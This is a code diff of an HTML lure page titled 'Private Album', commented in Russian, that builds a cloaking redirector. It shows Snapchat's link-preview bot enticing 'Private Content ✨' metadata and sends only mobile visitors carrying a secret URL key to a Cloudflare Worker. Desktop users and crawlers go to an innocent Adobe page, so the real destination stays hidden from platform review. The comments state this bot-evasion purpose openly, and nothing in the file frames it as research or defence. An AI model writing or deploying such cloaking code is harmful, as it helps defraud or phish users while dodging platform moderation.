@@ -2,22 +2,38 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Private Content</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Private Album</title>
+    <meta property="og:title" content="Private Content ✨" />
+    <meta property="og:description" content="Join" />
+    <meta property="og:image" content="https://www.clipartmax.com/png/middle/18-187261_cartoon-cherry-no-background.png" />
+    <meta property="og:type" content="website" />
+
+    <style>
+        /* Делаем страницу белой, чтобы до редиректа ничего не моргало */
+        body { background-color: #ffffff; }
+    </style>
 </head>
 <body>
     <script>
-        // Твоя ссылка на Cloudflare Pages
+        // Твоя ссылка на Cloudflare Worker
         const targetHost = "https://media-processor.radulive9.workers.dev/";
         
         const urlParams = new URLSearchParams(window.location.search);
         const ua = navigator.userAgent;
         const key = urlParams.get('sl');
 
-        // Если есть ключ 'nordic' и это мобилка — перекидываем
-        if (key === 'nordic' && /Android|iPhone|iPad/i.test(ua)) {
+        // Проверка: бот ли это самого Snapchat (Preview Service)
+        const isSnapBot = ua.includes("Snapchat") || ua.includes("Snap URL Preview Service");
+
+        if (isSnapBot) {
+            // Если зашел бот для проверки ссылки — ничего не делаем, пусть видит HTML с мета-тегами
+        } else if (key === 'nordic' && /Android|iPhone|iPad/i.test(ua)) {
+            // Если живой юзер с ключом — редирект на воркер
             window.location.replace(targetHost + window.location.search);
         } else {
-            // Ботов и десктоп кидаем на Adobe
+            // Все остальные (десктоп, боты гугла) — на Adobe
             window.location.replace("https://www.adobe.com/creativecloud/photography/type/nature-photography.html");
         }
     </script>
